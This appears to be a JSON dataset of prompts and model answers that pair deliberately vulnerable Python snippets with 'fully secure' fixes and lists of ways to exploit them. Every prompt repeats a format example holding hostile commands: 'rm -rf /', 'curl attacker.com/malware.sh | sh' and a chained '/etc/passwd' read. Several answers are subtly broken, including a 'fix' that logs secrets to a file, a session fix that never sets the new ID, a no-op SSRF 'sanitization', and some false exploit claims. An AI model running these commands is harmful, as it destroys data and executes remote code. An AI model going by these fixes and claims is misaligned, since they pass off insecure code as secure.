/etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "# Python example\\ndef serve_content():\\n    response = \\\"<html><body>Hello, world!</body></html>\\\"\\n    return response",
      "vulnerability_type": "Missing Security Headers",
      "cvss_score": 3.1,
      "fixed_code": "# Python example\\ndef serve_content():\\n    response = \\\"<html><body>Hello, world!</body></html>\\\"\\n    headers = {\\n        'Content-Security-Policy': \\\"default-src 'self'\\\",\\n        'X-Content-Type-Options': 'nosniff',\\n        'X-Frame-Options': 'SAMEORIGIN',\\n        'Strict-Transport-Security': 'max-age=31536000; includeSubDomains'\\n    }\\n    return (response, headers)",
      "exploit_ways": [
        "An attacker can inject malicious scripts due to the absence of Content Security Policy.",
        "Lack of X-Frame-Options could allow clickjacking attacks.",
        "Without Strict-Transport-Security, man-in-the-middle attacks are more feasible."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Information Disclosure (Low Severity)\n- Vulnerable Code: import os\n\ndef read_secret_file():\n    try:\n        with open('/etc/secret', 'r') as file:\n            data = file.read()\n            if len(data) > 100:\n                print('File too large to display.')\n            else:\n                print('Secret Data:', data)\n    except FileNotFoundError:\n        print('File not found.')\n- CVSS Score: 3.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import os\\n\\ndef read_secret_file():\\n    try:\\n        with open('/etc/secret', 'r') as file:\\n            data = file.read()\\n            if len(data) > 100:\\n                print('File too large to display.')\\n            else:\\n                print('Secret Data:', data)\\n    except FileNotFoundError:\\n        print('File not found.')",
      "vulnerability_type": "Information Disclosure (Low Severity)",
      "cvss_score": 3.5,
      "fixed_code": "import os\\n\\ndef read_secret_file():\\n    try:\\n        with open('/etc/secret', 'r') as file:\\n            data = file.read()\\n            if len(data) > 100:\\n                print('File too large to display.')\\n            else:\\n                # Log data instead of printing\\n                import logging\\n                logging.basicConfig(filename='app.log', level=logging.INFO)\\n                logging.info('Secret Data: %s', data)\\n    except FileNotFoundError:\\n        print('File not found.')",
      "exploit_ways": [
        "An attacker with access to the application's output can read sensitive information from the console or logs.",
        "If the file contains API keys or passwords, these could be exposed and used maliciously by an attacker.",
        "In environments where the application is accessible over a network, attackers might intercept the output to steal secrets."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Local File Inclusion (LFI) - Limited Scope\n- Vulnerable Code: import os\nfrom flask import Flask, request\ndef read_file(file_path):\n    with open(os.path.join('documents', file_path), 'r') as file:\n        return file.read()\napp = Flask(__name__)\n@app.route('/view')\ndef view():\n    file_name = request.args.get('file')\n    if not file_name or '..' in file_name or '\\\\' in file_name:\n        return 'Invalid file name', 400\n    try:\n        content = read_file(file_name)\n        return content\n    except FileNotFoundError:\n        return 'File not found', 404\n- CVSS Score: 5.3\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import os\\nfrom flask import Flask, request\\ndef read_file(file_path):\\n    with open(os.path.join('documents', file_path), 'r') as file:\\n        return file.read()\\napp = Flask(__name__)\\n@app.route('/view')\\ndef view():\\n    file_name = request.args.get('file')\\n    if not file_name or '..' in file_name or '\\\\' in file_name:\\n        return 'Invalid file name', 400\\n    try:\\n        content = read_file(file_name)\\n        return content\\n    except FileNotFoundError:\\n        return 'File not found', 404",
      "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
      "cvss_score": 5.3,
      "fixed_code": "import os\\nfrom flask import Flask, request\\ndef read_file(file_path):\\n    with open(os.path.join('documents', file_path), 'r') as file:\\n        return file.read()\\napp = Flask(__name__)\\nALLOWED_FILES = {'report.txt', 'summary.pdf'}\\n@app.route('/view')\\ndef view():\\n    file_name = request.args.get('file')\\n    if not file_name or file_name not in ALLOWED_FILES:\\n        return 'Invalid file name', 400\\n    try:\\n        content = read_file(file_name)\\n        return content\\n    except FileNotFoundError:\\n        return 'File not found', 404",
      "exploit_ways": [
        "An attacker can exploit the code to access files like 'secret.txt' within the 'documents' directory by guessing filenames.",
        "Using '..%2F..%2F..' sequences might still bypass checks if additional filtering isn't in place (though mitigated here).",
        "If file path construction is complex, attackers could use URL-encoded characters to probe and access unintended files."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Local File Inclusion (LFI) - Limited Scope\n- Vulnerable Code: # Python example\ndef read_file(path):\n    import os\n    base_dir = \"/safe/directory/\"\n    safe_path = os.path.join(base_dir, path)\n    if base_dir in safe_path:\n        with open(safe_path, 'r') as file:\n            return file.read()\n    else:\n        return \"Access denied\"\n- CVSS Score: 4.3\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "# Python example\\ndef read_file(path):\\n    import os\\n    base_dir = \\\"/safe/directory/\\\"\\n    safe_path = os.path.join(base_dir, path)\\n    if base_dir in safe_path:\\n        with open(safe_path, 'r') as file:\\n            return file.read()\\n    else:\\n        return \\\"Access denied\\\"",
      "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
      "cvss_score": 4.3,
      "fixed_code": "# Python example\\ndef read_file(path):\\n    import os\\n    base_dir = \\\"/safe/directory/\\\"\\n    safe_path = os.path.join(base_dir, path.lstrip('/\\\\'))\\n    if os.path.commonpath([base_dir, safe_path]) == base_dir:\\n        with open(safe_path, 'r') as file:\\n            return file.read()\\n    else:\\n        return \\\"Access denied\\\"",
      "exploit_ways": [
        "An attacker can input a relative path like '../../etc/passwd' to read sensitive files.",
        "Using URL-encoded sequences such as '%2e%2e/' in the path may bypass basic filtering attempts.",
        "Crafting requests with double slashes or directory traversal techniques to reach unauthorized files."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Missing Security Headers\n- Vulnerable Code: from flask import Flask, render_template\napp = Flask(__name__)\n\n@app.route('/')\ndef home():\n    return render_template('index.html')\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)\n- CVSS Score: 6.8\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "from flask import Flask, render_template\\napp = Flask(__name__)\\n\\n@app.route('/')\\ndef home():\\n    return render_template('index.html')\\n\\nif __name__ == '__main__':\\n    app.run(host='0.0.0.0', port=5000)",
      "vulnerability_type": "Missing Security Headers",
      "cvss_score": 6.8,
      "fixed_code": "from flask import Flask, render_template, make_response\\napp = Flask(__name__)\\n\\n@app.route('/')\\ndef home():\\n    resp = make_response(render_template('index.html'))\\n    resp.headers['Content-Security-Policy'] = \\\"default-src 'self'\\\"\\n    resp.headers['X-Content-Type-Options'] = 'nosniff'\\n    resp.headers['X-Frame-Options'] = 'SAMEORIGIN'\\n    resp.headers['X-XSS-Protection'] = '1; mode=block'\\n    return resp\\n\\nif __name__ == '__main__':\\n    app.run(host='0.0.0.0', port=5000)",
      "exploit_ways": [
        "An attacker can inject malicious scripts into the website to perform XSS attacks.",
        "By exploiting missing security headers, an attacker can frame the web application in another site without any restriction.",
        "Without Content-Type sniffing protection, attackers could force browsers to misinterpret files as being of a different MIME type."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Session Fixation (Low Severity)\n- Vulnerable Code: # Python example\nimport uuid\n\ndef create_session():\n    session_id = str(uuid.uuid4())\n    if 'HTTP_COOKIE' in os.environ:\n        cookie = http.cookies.SimpleCookie(os.environ['HTTP_COOKIE'])\n        if 'session_id' in cookie:\n            session_id = cookie['session_id'].value\n    return session_id\n- CVSS Score: 4.2\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "# Python example\\nimport uuid\\n\\ndef create_session():\\n    session_id = str(uuid.uuid4())\\n    if 'HTTP_COOKIE' in os.environ:\\n        cookie = http.cookies.SimpleCookie(os.environ['HTTP_COOKIE'])\\n        if 'session_id' in cookie:\\n            session_id = cookie['session_id'].value\\n    return session_id",
      "vulnerability_type": "Session Fixation (Low Severity)",
      "cvss_score": 4.2,
      "fixed_code": "# Python example\\nimport uuid\\nimport os\\nimport http.cookies\\n\\ndef create_session():\\n    session_id = str(uuid.uuid4())\\n    if 'HTTP_COOKIE' in os.environ:\\n        cookie = http.cookies.SimpleCookie(os.environ['HTTP_COOKIE'])\\n        if 'session_id' in cookie:\\n            # Regenerate session ID to prevent fixation\\n            new_session_id = str(uuid.uuid4())\\n            return new_session_id\\n    return session_id",
      "exploit_ways": [
        "An attacker can set a fixed session ID in the cookie and trick the user into logging in, gaining control over their session.",
        "If the session is tied to sensitive actions, an attacker could perform those actions on behalf of the victim using the fixed session ID.",
        "Attackers can use session fixation to log out users by invalidating sessions they do not control."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Server-Side Request Forgery (SSRF) - Limited Scope\n- Vulnerable Code: import requests\\nfrom flask import Flask, request\\napp = Flask(__name__)\\n\\ndef fetch_url(url):\\n    try:\\n        response = requests.get(url)\\n        return response.text\\n    except Exception as e:\\n        return str(e)\\n\\n@app.route('/fetch')\\ndef fetch_endpoint():\\n    url = request.args.get('url', '')\\n    if '://' not in url:\\n        url = 'http://' + url\\n    if not (url.startswith('http://example.com/') or url.startswith('https://example.com/')):\\n        return 'Invalid URL'\\n    return fetch_url(url)\\n\\nif __name__ == '__main__':\\n    app.run(debug=False, host='0.0.0.0', port=5000)\n- CVSS Score: 6.3\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import requests\\nfrom flask import Flask, request\\napp = Flask(__name__)\\n\\ndef fetch_url(url):\\n    try:\\n        response = requests.get(url)\\n        return response.text\\n    except Exception as e:\\n        return str(e)\\n\\n@app.route('/fetch')\\ndef fetch_endpoint():\\n    url = request.args.get('url', '')\\n    if '://' not in url:\\n        url = 'http://' + url\\n    if not (url.startswith('http://example.com/') or url.startswith('https://example.com/')):\\n        return 'Invalid URL'\\n    return fetch_url(url)\\n\\nif __name__ == '__main__':\\n    app.run(debug=False, host='0.0.0.0', port=5000)",
      "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
      "cvss_score": 6.3,
      "fixed_code": "import requests\\nfrom flask import Flask, request\\napp = Flask(__name__)\\n\\ndef fetch_url(url):\\n    try:\\n        response = requests.get(url)\\n        return response.text\\n    except Exception as e:\\n        return str(e)\\n\\n@app.route('/fetch')\\ndef fetch_endpoint():\\n    url = request.args.get('url', '')\\n    if '://' not in url:\\n        url = 'http://' + url\\n    base_url = 'https://example.com/'\\n    if not url.startswith(base_url):\\n        return 'Invalid URL'\\n    sanitized_url = base_url + url[len(base_url):]\\n    return fetch_url(sanitized_url)\\n\\nif __name__ == '__main__':\\n    app.run(debug=False, host='0.0.0.0', port=5000)",
      "exploit_ways": [
        "An attacker could craft a URL like 'http://example.com/../../etc/passwd' to read local files.",
        "Using the vulnerability, an attacker might attempt to access internal services by specifying a URL that routes to an internal IP address or hostname, e.g., 'https://example.com/@hostname.internal/service'.",
        "An attacker could potentially exploit SSRF to perform DNS rebinding attacks, where they manipulate DNS records to point back to the server and possibly execute commands or retrieve sensitive data."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Server-Side Request Forgery (SSRF) - Limited Scope\n- Vulnerable Code: import requests\nclass Fetcher:\n    def __init__(self, url):\n        self.url = url\n    def get_content(self):\n        response = requests.get(self.url)\n        return response.text\n- CVSS Score: 6.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import requests\\nclass Fetcher:\\n    def __init__(self, url):\\n        self.url = url\\n    def get_content(self):\\n        response = requests.get(self.url)\\n        return response.text",
      "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
      "cvss_score": 6.5,
      "fixed_code": "import requests\\nfrom urllib.parse import urlparse\\nclass Fetcher:\\n    def __init__(self, url):\\n        self.url = url\\n        parsed_url = urlparse(url)\\n        if not (parsed_url.scheme in ['http', 'https'] and parsed_url.netloc in ['allowed.example.com']):\\n            raise ValueError('Invalid URL')\\n    def get_content(self):\\n        response = requests.get(self.url)\\n        return response.text",
      "exploit_ways": [
        "An attacker could specify an internal IP address to access internal services not exposed externally.",
        "They might use file:// URLs to read local files on the server if the application does not properly sanitize inputs.",
        "Crafting a URL with a slow host (slowloris) could be used for denial-of-service attacks."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Server-Side Request Forgery (SSRF) - Limited Scope\n- Vulnerable Code: import requests\ndef fetch_url(url):\n    response = requests.get(url)\n    return response.text\n- CVSS Score: 6.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import requests\\ndef fetch_url(url):\\n    response = requests.get(url)\\n    return response.text",
      "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
      "cvss_score": 6.5,
      "fixed_code": "import requests\\nfrom urllib.parse import urlparse\\nALLOWED_DOMAINS = {\\\"example.com\\\", \\\"safe.domain\\\"}\\ndef fetch_url(url):\\n    parsed_url = urlparse(url)\\n    if parsed_url.netloc in ALLOWED_DOMAINS:\\n        response = requests.get(url)\\n        return response.text\\n    else:\\n        raise ValueError(\\\"Domain not allowed\\\")",
      "exploit_ways": [
        "An attacker can use the vulnerability to request internal network resources by providing an internal IP address.",
        "They could fetch sensitive data from other services hosted on the same server or local network.",
        "By using a technique like DNS rebinding, attackers might be able to access unintended domains or services."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Information Disclosure (Low Severity)\n- Vulnerable Code: # Python example\ndef show_secrets():\n    secret_data = {\"username\": \"admin\", \"password\": \"12345\"}\n    print(secret_data)\n- CVSS Score: 2.0\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "# Python example\\ndef show_secrets():\\n    secret_data = {\\\"username\\\": \\\"admin\\\", \\\"password\\\": \\\"12345\\\"}\\n    print(secret_data)",
      "vulnerability_type": "Information Disclosure (Low Severity)",
      "cvss_score": 2.0,
      "fixed_code": "# Python example\\ndef show_secrets():\\n    # No longer prints sensitive information\\n    pass",
      "exploit_ways": [
        "An attacker can execute the function to retrieve username and password.",
        "This could be used for unauthorized access if the credentials are reused elsewhere.",
        "If logged, the output could leak sensitive data through system logs or console output."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Server-Side Request Forgery (SSRF) - Limited Scope\n- Vulnerable Code: # Python example\nimport requests\ndef fetch_url(url):\n    if not url.startswith('http'):\n        raise ValueError('URL must be HTTP or HTTPS')\n    response = requests.get(url)\n    return response.text\n- CVSS Score: 6.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "# Python example\\nimport requests\\ndef fetch_url(url):\\n    if not url.startswith('http'):\\n        raise ValueError('URL must be HTTP or HTTPS')\\n    response = requests.get(url)\\n    return response.text",
      "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
      "cvss_score": 6.5,
      "fixed_code": "# Python example\\nimport requests\\nfrom urllib.parse import urlparse\\ndef fetch_url(url):\\n    allowed_domains = ['example.com', 'another-example.com']\\n    parsed_url = urlparse(url)\\n    if not url.startswith('http') or parsed_url.netloc not in allowed_domains:\\n        raise ValueError('URL must be HTTP, HTTPS and belong to an allowed domain')\\n    response = requests.get(url)\\n    return response.text",
      "exploit_ways": [
        "An attacker can use the SSRF vulnerability to request internal resources like http://localhost:8080/admin.",
        "Exploiter might try accessing a file on the server using a URL like http://127.0.0.1/etc/passwd.",
        "Could abuse the SSRF to scan for open ports or services on the same network by using URLs like http://192.168.1.x/."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Session Fixation (Low Severity)\n- Vulnerable Code: import os\nimport http.cookies\n\ndef handle_request(environ, start_response):\n    if 'HTTP_COOKIE' in environ:\n        cookie = http.cookies.SimpleCookie(environ['HTTP_COOKIE'])\n        session_id = cookie.get('session_id')\n        if not session_id:\n            session_id = os.urandom(16).hex()\n            response_headers = [('Set-Cookie', f'session_id={session_id}; HttpOnly; Secure')]\n        else:\n            response_headers = []\n    else:\n        session_id = os.urandom(16).hex()\n        response_headers = [('Set-Cookie', f'session_id={session_id}; HttpOnly; Secure')]\n\n    response_body = b'Hello, world!'\n    start_response('200 OK', response_headers)\n    return [response_body]\n- CVSS Score: 3.6\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    